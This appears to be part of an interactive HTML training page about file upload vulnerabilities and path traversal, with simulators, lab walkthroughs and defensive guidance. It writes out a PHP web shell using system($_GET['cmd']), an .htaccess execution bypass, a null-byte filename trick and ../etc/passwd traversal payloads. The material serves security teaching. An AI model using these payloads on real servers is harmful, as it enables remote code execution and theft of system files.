+<div style="font-size:14px;color:var(--bright);font-family:var(--mono)">"What if the application allows the user to upload something the web server can <span style="color:var(--red)">execute</span> instead of simply <span style="color:var(--green)">display</span>?"</div></div>
+</div></div>
+</section>
+
+<section class="sec" id="m1s2">
+<div class="snum">02</div>
+<div class="sh"><div class="stag">// MODULE 1</div><h2 class="stit">Static File vs Executable File</h2><p class="sdesc">Uploading a file and executing a file are two different events. This distinction is critical.</p></div>
+<div class="cd" style="margin-bottom:20px">
+<h3 style="font-family:var(--disp);font-size:14px;margin-bottom:14px;font-weight:700;color:var(--cyan)">Toggle Between Static and Executable</h3>
+<div style="display:flex;gap:8px;margin-bottom:16px">
+<button class="btn bg" id="btn-static" onclick="showFT('static')" style="border-color:var(--green);color:var(--green)">STATIC FILE</button>
+<button class="btn bg" id="btn-exec" onclick="showFT('exec')">EXECUTABLE FILE</button></div>
+<div id="ft-static"><div class="fd" style="margin-bottom:14px">
+<div class="fs"><div class="fi gn">🖼️</div><div class="fl">avatar.jpg</div></div><div class="fa"></div>
+<div class="fs"><div class="fi cy">🌐</div><div class="fl">HTTP request</div></div><div class="fa"></div>
+<div class="fs"><div class="fi cy">📄</div><div class="fl">Web server reads bytes</div></div><div class="fa"></div>
+<div class="fs"><div class="fi gn">🖥️</div><div class="fl">Returns raw data</div></div><div class="fa"></div>
+<div class="fs"><div class="fi gn">🖼️</div><div class="fl">Browser displays image</div></div>
+</div><div class="hb2 hbg" style="font-family:var(--mono);font-size:12px">The web server <strong>treats the file as data</strong>. It reads bytes and sends them to the browser. No code runs on the server.</div></div>
+<div id="ft-exec" style="display:none"><div class="fd" style="margin-bottom:14px">
+<div class="fs"><div class="fi rd">📄</div><div class="fl">shell.php</div></div><div class="fa"></div>
+<div class="fs"><div class="fi cy">🌐</div><div class="fl">HTTP request</div></div><div class="fa"></div>
+<div class="fs"><div class="fi rd">⚙️</div><div class="fl">Runtime interprets code</div></div><div class="fa"></div>
+<div class="fs"><div class="fi rd">💻</div><div class="fl">Code executes ON SERVER</div></div><div class="fa"></div>
+<div class="fs"><div class="fi am">📤</div><div class="fl">Result returned</div></div>
+</div><div class="hb2 hbr" style="font-family:var(--mono);font-size:12px">The web server <strong>interprets the file as code</strong>. The PHP/ASP/JSP runtime executes the script. <strong>Code runs on the server's OS.</strong></div></div></div>
+<div class="cd dg2"><div style="text-align:center;padding:20px">
+<div style="font-family:var(--disp);font-size:20px;font-weight:800;color:var(--bright);margin-bottom:8px">Core Takeaway</div>
+<div style="font-family:var(--mono);font-size:14px;color:var(--red)">Uploading a file ≠ Executing a file</div>
+<div style="font-size:13px;color:var(--dim);margin-top:8px">The vulnerability exists when the server treats uploaded content as executable code rather than static data.</div></div></div>
+</section>
+
+<section class="sec" id="m1s3">
+<div class="snum">03</div>
+<div class="sh"><div class="stag">// MODULE 1</div><h2 class="stit">File Anatomy — The File Inspector</h2><p class="sdesc">A filename is not the same as file content. An extension is not proof of file type. A MIME header is user-controllable.</p></div>
+<div class="simc"><div class="simh">🔬 Interactive File Inspector <span class="tg in" style="margin-left:8px">SAFE</span></div><div class="simb">
+<div style="margin-bottom:14px"><div style="font-family:var(--mono);font-size:11px;color:var(--dim);margin-bottom:6px">Click a file to inspect:</div>
+<div style="display:flex;gap:6px;flex-wrap:wrap">
+<button class="btn bg" onclick="inspF('profile.jpg')">profile.jpg</button>
+<button class="btn bg" onclick="inspF('shell.php')">shell.php</button>
+<button class="btn bg" onclick="inspF('resume.php.jpg')">resume.php.jpg</button>
+<button class="btn bg" onclick="inspF('image.php%00.jpg')">image.php%00.jpg</button>
+<button class="btn bg" onclick="inspF('photo.png')">photo.png</button>
+</div></div>
+<div id="inp-out" class="term"><div class="tbar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><div class="tt">File Inspector — click a file above</div></div>
+<div class="tbody" id="inp-body"><span class="tl"><span class="tcm">// Select a file to analyze its properties</span></span></div></div></div></div>
+<div class="cd" style="margin-top:20px"><h3 style="font-family:var(--disp);font-size:14px;margin-bottom:12px;font-weight:700;color:var(--amber)">Key Understanding</h3>
+<div class="g3">
+<div class="hb2 hby" style="font-size:12px"><strong style="color:var(--amber)">Filename</strong><br>Just a label. User-controlled. Not trustworthy.</div>
+<div class="hb2 hby" style="font-size:12px"><strong style="color:var(--amber)">Extension</strong><br>Hint to the OS/web server. Can be spoofed.</div>
+<div class="hb2 hby" style="font-size:12px"><strong style="color:var(--amber)">Content-Type</strong><br>Sent by the client. Can be modified with Burp Suite.</div>
+</div></div></section>
+<section class="sec" id="m1s4">
+<div class="snum">04</div>
+<div class="sh"><div class="stag">// MODULE 1</div><h2 class="stit">Client-Side vs Server-Side Validation</h2><p class="sdesc">Client-side validation improves UX. Server-side validation provides the actual security boundary.</p></div>
+<div class="g2">
+<div class="cd suc"><h3 style="font-family:var(--disp);font-size:14px;margin-bottom:12px;font-weight:700;color:var(--green)">🔒 Server-Side Validation</h3>
+<p style="font-size:12px;color:var(--dim);line-height:1.7;margin-bottom:10px">Runs on the server after the request arrives. The user cannot bypass it without modifying the server request.</p>
+<div class="hb2 hbg" style="font-family:var(--mono);font-size:11px">✔ Actually checks file content<br>✔ Validates on the server<br>✔ Cannot be disabled by the user</div></div>
+<div class="cd dg2"><h3 style="font-family:var(--disp);font-size:14px;margin-bottom:12px;font-weight:700;color:var(--red)">⚠️ Client-Side Validation</h3>
+<p style="font-size:12px;color:var(--dim);line-height:1.7;margin-bottom:10px">Runs in the browser before the request is sent. The user controls the browser — they can disable or bypass it entirely.</p>
+<div class="hb2 hbr" style="font-family:var(--mono);font-size:11px">✗ Can be disabled in browser<br>✗ Can be intercepted by Burp<br>✗ Never trust for security</div></div></div>
+<div class="simc" style="margin-top:20px"><div class="simh">🧪 Burp Suite Interception Demo</div><div class="simb">
+<p style="font-size:12px;color:var(--dim);margin-bottom:14px">Watch how the browser enforces "JPG/PNG only" — but Burp Suite can change the Content-Type header:</p>
+<div class="term"><div class="tbar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><div class="tt">Burp Suite — Intercepted Request</div></div>
+<div class="tbody" style="font-size:11px">
+<span class="tl"><span class="ta">POST</span> /my-account/avatar HTTP/1.1</span>
+<span class="tl"><span class="tp">Content-Type:</span> multipart/form-data; boundary=----Bound</span>
+<span class="tl">&nbsp;</span>
+<span class="tl"><span class="tcm">------Bound</span></span>
+<span class="tl"><span class="tp">Content-Disposition:</span> form-data; name=<span class="sr">"avatar"</span>; filename=<span class="sr">"exploit.php"</span></span>
+<span class="tl"><span class="tp">Content-Type:</span> <span class="ts">image/jpeg</span> <span class="tcm">← CHANGED from application/x-php</span></span>
+<span class="tl">&nbsp;</span>
+<span class="tl"><span class="td2">&lt;?php system($_GET['cmd']); ?&gt;</span></span>
+<span class="tl"><span class="tcm">------Bound--</span></span></div></div>
+<div class="hb2 hbr" style="margin-top:12px;font-family:var(--mono);font-size:11px">The browser said "JPG/PNG only" — but we control the browser. Burp modified Content-Type to image/jpeg. Server accepted the PHP file.</div></div></div></section>
+
+<section class="sec" id="m1s5">
+<div class="snum">05</div>
+<div class="sh"><div class="stag">// MODULE 1</div><h2 class="stit">Common Validation Failures</h2><p class="sdesc">For each method, understand the developer's assumption, why it fails, and the secure alternative.</p></div>
+<div style="display:flex;flex-direction:column;gap:10px">
+<div class="cd" onclick="togByp(this)" style="cursor:pointer">
+<div style="display:flex;justify-content:space-between;align-items:center"><div><span class="tg cr" style="margin-right:8px">VULNERABLE</span><span style="font-weight:600;color:var(--bright);font-size:14px">Extension-Only Validation</span></div><span style="color:var(--dim);font-size:18px">▼</span></div>
+<div class="bdet" style="display:none;margin-top:12px"><div class="g2">
+<div><div style="font-family:var(--mono);font-size:11px;color:var(--amber);margin-bottom:6px">DEVELOPER ASSUMPTION</div><div style="font-size:12px;color:var(--dim)">"If I block .php, attackers can't upload PHP files."</div></div>
+<div><div style="font-family:var(--mono);font-size:11px;color:var(--red);margin-bottom:6px">WHY IT FAILS</div><div style="font-size:12px;color:var(--dim)">Double extensions (shell.php.jpg), alternative extensions (.phtml, .php5), null bytes bypass blacklist filters.</div></div></div></div></div>
+<div class="cd" onclick="togByp(this)" style="cursor:pointer">
+<div style="display:flex;justify-content:space-between;align-items:center"><div><span class="tg cr" style="margin-right:8px">VULNERABLE</span><span style="font-weight:600;color:var(--bright);font-size:14px">MIME-Type / Content-Type Validation</span></div><span style="color:var(--dim);font-size:18px">▼</span></div>
+<div class="bdet" style="display:none;margin-top:12px"><div class="g2">
+<div><div style="font-family:var(--mono);font-size:11px;color:var(--amber);margin-bottom:6px">DEVELOPER ASSUMPTION</div><div style="font-size:12px;color:var(--dim)">"I check Content-Type header — it must be image/jpeg."</div></div>
+<div><div style="font-family:var(--mono);font-size:11px;color:var(--red);margin-bottom:6px">WHY IT FAILS</div><div style="font-size:12px;color:var(--dim)">Content-Type is sent by the client. Burp Suite can change it to image/jpeg while uploading a PHP file.</div></div></div></div></div>
+<div class="cd" onclick="togByp(this)" style="cursor:pointer">
+<div style="display:flex;justify-content:space-between;align-items:center"><div><span class="tg cr" style="margin-right:8px">VULNERABLE</span><span style="font-weight:600;color:var(--bright);font-size:14px">Blacklist Filtering</span></div><span style="color:var(--dim);font-size:18px">▼</span></div>
+<div class="bdet" style="display:none;margin-top:12px"><div class="g2">
+<div><div style="font-family:var(--mono);font-size:11px;color:var(--amber);margin-bottom:6px">DEVELOPER ASSUMPTION</div><div style="font-size:12px;color:var(--dim)">"I block .php, .php5, .phtml — all dangerous extensions."</div></div>
+<div><div style="font-family:var(--mono);font-size:11px;color:var(--red);margin-bottom:6px">WHY IT FAILS</div><div style="font-size:12px;color:var(--dim)">Attackers can upload .htaccess to change Apache config, or use .phar, .inc, or other extensions the blacklist misses.</div></div></div></div></div>
+<div class="cd" onclick="togByp(this)" style="cursor:pointer">
+<div style="display:flex;justify-content:space-between;align-items:center"><div><span class="tg wr" style="margin-right:8px">PARTIAL</span><span style="font-weight:600;color:var(--bright);font-size:14px">Allowlist Validation</span></div><span style="color:var(--dim);font-size:18px">▼</span></div>
+<div class="bdet" style="display:none;margin-top:12px"><div class="g2">
+<div><div style="font-family:var(--mono);font-size:11px;color:var(--green);margin-bottom:6px">BETTER APPROACH</div><div style="font-size:12px;color:var(--dim)">Only allow specific extensions: .jpg, .png, .gif. Much harder to bypass.</div></div>
+<div><div style="font-family:var(--mono);font-size:11px;color:var(--amber);margin-bottom:6px">STILL NOT SUFFICIENT ALONE</div><div style="font-size:12px;color:var(--dim)">Must combine with content inspection, randomized filenames, storage outside webroot, and disabled execution in upload directories.</div></div></div></div></div>
+</div></section>
+
+<section class="sec" id="m1s6">
+<div class="snum">06</div>
+<div class="sh"><div class="stag">// MODULE 1</div><h2 class="stit">Storage Location Matters</h2><p class="sdesc">Even if validation fails, storage and execution policy provide another security boundary.</p></div>
+<div class="g2">
+<div class="cd dg2"><h3 style="font-family:var(--disp);font-size:14px;margin-bottom:12px;font-weight:700;color:var(--red)">❌ DANGEROUS Architecture</h3>
+<div class="fd" style="flex-direction:column;gap:6px;align-items:stretch">
+<div style="padding:8px 12px;background:rgba(239,68,68,0.04);border:1px solid rgba(239,68,68,0.12);border-radius:4px;font-family:var(--mono);font-size:11px">Upload → <span style="color:var(--red)">/var/www/html/uploads/</span></div>
+<div style="padding:8px 12px;background:rgba(239,68,68,0.04);border:1px solid rgba(239,68,68,0.12);border-radius:4px;font-family:var(--mono);font-size:11px">Publicly reachable via URL ✓</div>
+<div style="padding:8px 12px;background:rgba(239,68,68,0.04);border:1px solid rgba(239,68,68,0.12);border-radius:4px;font-family:var(--mono);font-size:11px">PHP/ASP execution enabled ✓</div></div>
+<div class="hb2 hbr" style="margin-top:10px;font-size:12px">Files stored inside web root with full execution permissions.</div></div>
+<div class="cd suc"><h3 style="font-family:var(--disp);font-size:14px;margin-bottom:12px;font-weight:700;color:var(--green)">✅ SAFER Architecture</h3>
+<div class="fd" style="flex-direction:column;gap:6px;align-items:stretch">
+<div style="padding:8px 12px;background:rgba(34,197,94,0.04);border:1px solid rgba(34,197,94,0.12);border-radius:4px;font-family:var(--mono);font-size:11px">Upload → Random filename generated</div>
+<div style="padding:8px 12px;background:rgba(34,197,94,0.04);border:1px solid rgba(34,197,94,0.12);border-radius:4px;font-family:var(--mono);font-size:11px">Storage outside executable webroot</div>
+<div style="padding:8px 12px;background:rgba(34,197,94,0.04);border:1px solid rgba(34,197,94,0.12);border-radius:4px;font-family:var(--mono);font-size:11px">Served through controlled application logic only</div></div>
+<div class="hb2 hbg" style="margin-top:10px;font-size:12px">Even if attacker uploads PHP, the server won't execute it.</div></div></div>
+<div class="cd" style="margin-top:20px"><div style="text-align:center;padding:16px">
+<div style="font-family:var(--disp);font-size:18px;font-weight:800;color:var(--bright);margin-bottom:6px">UPLOAD ≠ EXECUTION</div>
+<div style="font-size:13px;color:var(--dim)">Storage location and web server configuration determine whether an uploaded file can be executed.</div></div></div></section>
+<section class="sec" id="m1s7">
+<div class="snum">07</div>
+<div class="sh"><div class="stag">// MODULE 1</div><h2 class="stit">Web Shell Simulator</h2><p class="sdesc">A web shell turns a file upload vulnerability into server-side command execution.</p></div>
+<div class="simc"><div class="simh">🖥️ Web Shell Terminal <span class="tg wr" style="margin-left:8px">SAFE SIMULATION</span></div><div class="simb">
+<div class="term"><div class="tbar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><div class="tt">http://target.com/uploads/shell.php</div></div>
+<div class="tbody" id="shell-term"><span class="tl"><span class="tcm"># Simulated web shell — no real execution</span></span>
+<span class="tl"><span class="tp">$</span> <span class="tc" id="shell-cmd">_</span></span></div></div>
+<div style="margin-top:12px;display:flex;gap:6px;flex-wrap:wrap">
+<button class="btn bg" onclick="rsc('whoami')">whoami</button>
+<button class="btn bg" onclick="rsc('ls /var/www/html')">ls /var/www/html</button>
+<button class="btn bg" onclick="rsc('cat /etc/passwd')">cat /etc/passwd</button>
+<button class="btn bg" onclick="rsc('id')">id</button>
+<button class="btn bg" onclick="rsc('uname -a')">uname -a</button>
+<button class="btn br" onclick="resetShell()">Reset</button>
+</div></div></div>
+<div class="cd" style="margin-top:20px"><h3 style="font-family:var(--disp);font-size:14px;margin-bottom:12px;font-weight:700;color:var(--cyan)">What Happens Under the Hood</h3>
+<div class="fd">
+<div class="fs"><div class="fi rd">👤</div><div class="fl">Attacker visits shell URL</div></div><div class="fa"></div>
+<div class="fs"><div class="fi cy">🌐</div><div class="fl">HTTP GET request</div></div><div class="fa"></div>
+<div class="fs"><div class="fi rd">⚙️</div><div class="fl">PHP runtime executes code</div></div><div class="fa"></div>
+<div class="fs"><div class="fi rd">💻</div><div class="fl">OS command runs</div></div><div class="fa"></div>
+<div class="fs"><div class="fi am">📤</div><div class="fl">Output returned</div></div>
+</div></div></section>
+
+<section class="sec" id="m1labs">
+<div class="snum">08</div>
+<div class="sh"><div class="stag">// MODULE 1 — PRACTICAL LABS</div><h2 class="stit">File Upload Lab Walkthroughs</h2><p class="sdesc">Every lab: Scenario → Request → User Input → Validation → Execution → Root Cause → Defense.</p></div>
+<div class="tabs">
+<button class="tb act" onclick="sLT('l1')">Lab 1: No Validation</button>
+<button class="tb" onclick="sLT('l2')">Lab 2: Content-Type</button>
+<button class="tb" onclick="sLT('l3')">Lab 3: Path Traversal</button>
+<button class="tb" onclick="sLT('l4')">Lab 4: Extension Blacklist</button>
+<button class="tb" onclick="sLT('l5')">Lab 5: Obfuscated Ext</button>
+</div>
+<div id="l1" class="tp2 act"><div class="cd"><h3 style="font-family:var(--disp);font-size:15px;margin-bottom:12px;font-weight:700;color:var(--red)">Lab 1: RCE via Web Shell Upload</h3>
+<div class="hb2 hbr" style="font-size:12px;margin-bottom:14px">No validation on uploaded files. Direct RCE.</div>
+<div style="display:flex;flex-direction:column;gap:10px">
+<div style="display:flex;gap:12px;align-items:flex-start;padding:12px;border:1px solid var(--border);border-radius:6px;background:rgba(0,0,0,0.2)"><div style="width:26px;height:26px;border-radius:50%;background:var(--cd);border:1px solid rgba(139,92,246,0.15);display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:11px;color:var(--cyan);font-weight:700;flex-shrink:0">1</div><div><div style="font-weight:600;color:var(--bright);font-size:13px;margin-bottom:3px">Login with wiener:peter</div><div style="font-size:12px;color:var(--dim)">Navigate to avatar upload</div></div></div>
+<div style="display:flex;gap:12px;align-items:flex-start;padding:12px;border:1px solid var(--border);border-radius:6px;background:rgba(0,0,0,0.2)"><div style="width:26px;height:26px;border-radius:50%;background:var(--cd);border:1px solid rgba(139,92,246,0.15);display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:11px;color:var(--cyan);font-weight:700;flex-shrink:0">2</div><div><div style="font-weight:600;color:var(--bright);font-size:13px;margin-bottom:3px">Create PHP web shell</div><div style="font-family:var(--mono);font-size:11px;color:var(--green);background:rgba(34,197,94,0.06);padding:6px 10px;border-radius:4px;margin-top:4px">&lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;</div></div></div>
+<div style="display:flex;gap:12px;align-items:flex-start;padding:12px;border:1px solid var(--border);border-radius:6px;background:rgba(0,0,0,0.2)"><div style="width:26px;height:26px;border-radius:50%;background:var(--cd);border:1px solid rgba(139,92,246,0.15);display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:11px;color:var(--cyan);font-weight:700;flex-shrink:0">3</div><div><div style="font-weight:600;color:var(--bright);font-size:13px;margin-bottom:3px">Upload exploit.php — accepted without validation</div></div></div>
+<div style="display:flex;gap:12px;align-items:flex-start;padding:12px;border:1px solid var(--border);border-radius:6px;background:rgba(0,0,0,0.2)"><div style="width:26px;height:26px;border-radius:50%;background:var(--gd);border:1px solid rgba(34,197,94,0.15);display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:11px;color:var(--green);font-weight:700;flex-shrink:0">✓</div><div><div style="font-weight:600;color:var(--bright);font-size:13px;margin-bottom:3px">Access /files/avatars/exploit.php</div><div style="font-size:12px;color:var(--green)">PHP executes → secret displayed → Lab solved ✓</div></div></div>
+</div></div></div>
+<div id="l2" class="tp2"><div class="cd"><h3 style="font-family:var(--disp);font-size:15px;margin-bottom:12px;font-weight:700;color:var(--red)">Lab 2: Content-Type Bypass</h3>
+<div class="hb2 hbr" style="font-size:12px;margin-bottom:14px">Server checks Content-Type header only. Trivially spoofed.</div>
+<div style="display:flex;flex-direction:column;gap:10px">
+<div style="display:flex;gap:12px;align-items:flex-start;padding:12px;border:1px solid var(--border);border-radius:6px;background:rgba(0,0,0,0.2)"><div style="width:26px;height:26px;border-radius:50%;background:var(--cd);border:1px solid rgba(139,92,246,0.15);display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:11px;color:var(--cyan);font-weight:700;flex-shrink:0">1</div><div><div style="font-weight:600;color:var(--bright);font-size:13px;margin-bottom:3px">Intercept upload with Burp Suite</div></div></div>
+<div style="display:flex;gap:12px;align-items:flex-start;padding:12px;border:1px solid var(--border);border-radius:6px;background:rgba(0,0,0,0.2)"><div style="width:26px;height:26px;border-radius:50%;background:var(--rd);border:1px solid rgba(239,68,68,0.15);display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:11px;color:var(--red);font-weight:700;flex-shrink:0">2</div><div><div style="font-weight:600;color:var(--bright);font-size:13px;margin-bottom:3px">Change Content-Type: application/x-php → image/jpeg</div></div></div>
+<div style="display:flex;gap:12px;align-items:flex-start;padding:12px;border:1px solid var(--border);border-radius:6px;background:rgba(0,0,0,0.2)"><div style="width:26px;height:26px;border-radius:50%;background:var(--gd);border:1px solid rgba(34,197,94,0.15);display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:11px;color:var(--green);font-weight:700;flex-shrink:0">✓</div><div><div style="font-weight:600;color:var(--bright);font-size:13px;margin-bottom:3px">Forward → PHP executes → Lab solved ✓</div></div></div>
+</div></div></div>
+<div id="l3" class="tp2"><div class="cd"><h3 style="font-family:var(--disp);font-size:15px;margin-bottom:12px;font-weight:700;color:var(--red)">Lab 3: Path Traversal in Filename</h3>
+<div class="hb2 hbr" style="font-size:12px;margin-bottom:14px">Execution blocked in /uploads/ — filename traversal moves file outside.</div>
+<div style="display:flex;gap:12px;align-items:flex-start;padding:12px;border:1px solid var(--border);border-radius:6px;background:rgba(0,0,0,0.2)"><div style="width:26px;height:26px;border-radius:50%;background:var(--rd);border:1px solid rgba(239,68,68,0.15);display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:11px;color:var(--red);font-weight:700;flex-shrink:0">!</div><div><div style="font-weight:600;color:var(--bright);font-size:13px;margin-bottom:3px">Modify filename: %2e%2e%2f/shell.php → ../shell.php</div><div style="font-size:11px;color:var(--dim);margin-top:4px">File saved outside /uploads/ — execution restrictions bypassed.</div></div></div>
+<div style="display:flex;gap:12px;align-items:flex-start;padding:12px;border:1px solid var(--border);border-radius:6px;background:rgba(0,0,0,0.2);margin-top:10px"><div style="width:26px;height:26px;border-radius:50%;background:var(--gd);border:1px solid rgba(34,197,94,0.15);display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:11px;color:var(--green);font-weight:700;flex-shrink:0">✓</div><div><div style="font-weight:600;color:var(--bright);font-size:13px;margin-bottom:3px">Access /files/avatars/../shell.php → Lab solved ✓</div></div></div>
+</div></div>
+<div id="l4" class="tp2"><div class="cd"><h3 style="font-family:var(--disp);font-size:15px;margin-bottom:12px;font-weight:700;color:var(--red)">Lab 4: Extension Blacklist Bypass via .htaccess</h3>
+<div class="hb2 hbr" style="font-size:12px;margin-bottom:14px">Upload .htaccess to teach Apache to execute .cybersec as PHP.</div>
+<div style="display:flex;flex-direction:column;gap:10px">
+<div style="display:flex;gap:12px;align-items:flex-start;padding:12px;border:1px solid var(--border);border-radius:6px;background:rgba(0,0,0,0.2)"><div style="width:26px;height:26px;border-radius:50%;background:var(--rd);border:1px solid rgba(239,68,68,0.15);display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:11px;color:var(--red);font-weight:700;flex-shrink:0">1</div><div><div style="font-weight:600;color:var(--bright);font-size:13px;margin-bottom:3px">Upload .htaccess: AddType application/x-httpd-php .cybersec</div></div></div>
+<div style="display:flex;gap:12px;align-items:flex-start;padding:12px;border:1px solid var(--border);border-radius:6px;background:rgba(0,0,0,0.2)"><div style="width:26px;height:26px;border-radius:50%;background:var(--cd);border:1px solid rgba(139,92,246,0.15);display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:11px;color:var(--cyan);font-weight:700;flex-shrink:0">2</div><div><div style="font-weight:600;color:var(--bright);font-size:13px;margin-bottom:3px">Upload exploit.cybersec — Apache treats as PHP</div></div></div>
+<div style="display:flex;gap:12px;align-items:flex-start;padding:12px;border:1px solid var(--border);border-radius:6px;background:rgba(0,0,0,0.2)"><div style="width:26px;height:26px;border-radius:50%;background:var(--gd);border:1px solid rgba(34,197,94,0.15);display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:11px;color:var(--green);font-weight:700;flex-shrink:0">✓</div><div><div style="font-weight:600;color:var(--bright);font-size:13px;margin-bottom:3px">Access exploit.cybersec → PHP executes → Lab solved ✓</div></div></div>
+</div></div></div>
+<div id="l5" class="tp2"><div class="cd"><h3 style="font-family:var(--disp);font-size:15px;margin-bottom:12px;font-weight:700;color:var(--red)">Lab 5: Obfuscated Extension (Null Byte)</h3>
+<div class="hb2 hbr" style="font-size:12px;margin-bottom:14px">Use %00 to truncate — app sees .jpg, server executes .php</div>
+<div style="display:flex;gap:12px;align-items:flex-start;padding:12px;border:1px solid var(--border);border-radius:6px;background:rgba(0,0,0,0.2)"><div style="width:26px;height:26px;border-radius:50%;background:var(--pd);border:1px solid rgba(139,92,246,0.15);display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:11px;color:var(--purple);font-weight:700;flex-shrink:0">!</div><div><div style="font-weight:600;color:var(--bright);font-size:13px;margin-bottom:3px">Payload: shell.php%00.jpg</div><div style="font-size:12px;color:var(--dim);margin-top:4px">%00 = null byte. App sees .jpg, filesystem executes .php. Requires legacy PHP (&lt;5.3.4).</div></div></div>
+<div style="display:flex;gap:12px;align-items:flex-start;padding:12px;border:1px solid var(--border);border-radius:6px;background:rgba(0,0,0,0.2);margin-top:10px"><div style="width:26px;height:26px;border-radius:50%;background:var(--gd);border:1px solid rgba(34,197,94,0.15);display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:11px;color:var(--green);font-weight:700;flex-shrink:0">✓</div><div><div style="font-weight:600;color:var(--bright);font-size:13px">Filter bypassed → PHP executes → Lab solved ✓</div></div></div>
+</div></div></section>
+<section class="sec" id="m2s1">
+<div class="snum">09</div>
+<div class="sh"><div class="stag">// MODULE 2 — PATH TRAVERSAL</div><h2 class="stit">Filesystem Fundamentals</h2><p class="sdesc">Before understanding path traversal, students need clear filesystem knowledge.</p></div>
+<div class="g2"><div>
+<h3 style="color:var(--cyan);font-family:var(--disp);font-size:14px;margin-bottom:12px;font-weight:700">Interactive Linux File Tree</h3>
+<div class="ftree">
+<div class="tli" style="color:var(--amber)">📁 / (root)</div>
+<div class="tind"><div class="tli" style="color:var(--amber)">📁 home/</div><div class="tind"><div class="tli">📁 user/</div></div></div>
+<div class="tind"><div class="tli" style="color:var(--amber)">📁 var/</div>
+<div class="tind"><div class="tli" style="color:var(--amber)">📁 www/</div>
+<div class="tind"><div class="tli" style="color:var(--amber)">📁 html/</div>
+<div class="tind"><div class="tli" style="color:var(--cyan)">📁 images/ ← allowed zone</div>
+<div class="tind"><div class="tli">🖼 dog.jpg</div><div class="tli">🖼 cat.jpg</div></div>
+</div></div></div></div>
+<div class="tind"><div class="tli" style="color:var(--amber)">📁 etc/</div>
+<div class="tind"><div class="tli hl">🔴 passwd ← attacker target</div><div class="tli hl">🔴 shadow</div></div></div>
+</div></div>
+<div><h3 style="color:var(--cyan);font-family:var(--disp);font-size:14px;margin-bottom:12px;font-weight:700">Path Concepts</h3>
+<div class="hb2 hbc" style="font-size:12px;line-height:2.2;font-family:var(--mono);margin-bottom:12px">
+<strong style="color:var(--cyan)">Absolute Path:</strong><br>/var/www/html/images/cat.jpg<br><br>
+<strong style="color:var(--cyan)">Relative Path:</strong><br>images/cat.jpg<br><br>
+<strong style="color:var(--amber)">.</strong> = Current directory<br>
+<strong style="color:var(--red)">..</strong> = Parent directory (one level up)</div>
+<div class="hb2 hby" style="font-size:12px"><strong style="color:var(--amber)">Key concept:</strong> Each <code style="color:var(--red)">../</code> moves one directory level up.</div></div></div></section>
+
+<section class="sec" id="m2s2">
+<div class="snum">10</div>
+<div class="sh"><div class="stag">// MODULE 2</div><h2 class="stit">Understanding ../</h2><p class="sdesc">Each ../ moves one level up. This is the core mechanism behind path traversal.</p></div>
+<div class="cd"><h3 style="font-family:var(--disp);font-size:14px;margin-bottom:12px;font-weight:700;color:var(--cyan)">Traversal Depth Slider</h3>
+<p style="font-size:12px;color:var(--dim);margin-bottom:10px">Drag to add more <code style="color:var(--red)">../</code> and watch the resolved path change:</p>
+<input type="range" min="0" max="5" value="0" oninput="updTrav(this.value)">
+<div id="trav-disp" class="fvis"><div class="fn2 ad">📁 images/<div style="font-size:9px;color:var(--dim)">start</div></div></div>
+<div id="trav-path" class="pdisp"><span class="psg n">/var/www/html/images/</span></div>
+<div id="trav-exp" class="hb2 hbc" style="font-size:12px;font-family:var(--mono)">Starting position: /var/www/html/images/</div></div></section>
+
+<section class="sec" id="m2s3">
+<div class="snum">11</div>
+<div class="sh"><div class="stag">// MODULE 2</div><h2 class="stit">Interactive Path Traversal Simulation</h2><p class="sdesc">Test payloads against a simulated server. Understand what each payload does.</p></div>
+<div class="simc"><div class="simh">🧪 Payload Tester <span class="tg in" style="margin-left:8px">SAFE</span></div><div class="simb">
+<div style="font-family:var(--mono);font-size:12px;color:var(--dim);margin-bottom:8px">GET /image?filename=<span style="color:var(--green)">▌</span></div>
+<input type="text" id="payin" value="dog.jpg" placeholder="Type filename..." style="width:100%;background:#010710;border:1px solid var(--border);border-radius:6px;color:var(--green);font-family:var(--mono);font-size:13px;padding:10px 14px;outline:none;margin-bottom:10px" oninput="testPay(this.value)">
+<div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:12px">
+<button class="btn bg" onclick="setPay('dog.jpg')">dog.jpg</button>
+<button class="btn bg" onclick="setPay('../../etc/passwd')">../../etc/passwd</button>
+<button class="btn bg" onclick="setPay('../../../etc/passwd')">../../../</button>
+<button class="btn bg br" onclick="setPay('../../../../etc/passwd')">../../../../</button>
+<button class="btn bg ba" onclick="setPay('/etc/passwd')">/etc/passwd</button>
+</div>
+<div id="pay-res" style="padding:12px;border-radius:6px;font-family:var(--mono);font-size:12px;line-height:1.7;border:1px solid var(--border);background:#010710;min-height:60px"><span style="color:var(--dim)">▷ Type a payload or click a button</span></div>
+</div></div></section>
+
+<section class="sec" id="m2s4">
+<div class="snum">12</div>
+<div class="sh"><div class="stag">// MODULE 2</div><h2 class="stit">Path Traversal vs LFI vs RFI</h2><p class="sdesc">Read ≠ Include ≠ Execute Remote. Understanding the differences is critical.</p></div>
+<div class="g3" style="margin-bottom:18px">
+<div class="cd"><h3 style="font-family:var(--disp);font-size:13px;margin-bottom:10px;font-weight:700;color:var(--cyan)">📂 Path Traversal</h3>
+<div style="text-align:center;font-size:12px;margin:12px 0"><div style="font-size:30px;margin-bottom:6px">📖</div><strong style="color:var(--cyan)">READ</strong> a file<br><span style="color:var(--dim)">Escape directory → access file</span></div>
+<div class="cb" style="font-size:10px">?file=../../../../etc/passwd</div></div>
+<div class="cd wrn"><h3 style="font-family:var(--disp);font-size:13px;margin-bottom:10px;font-weight:700;color:var(--amber)">📥 LFI</h3>
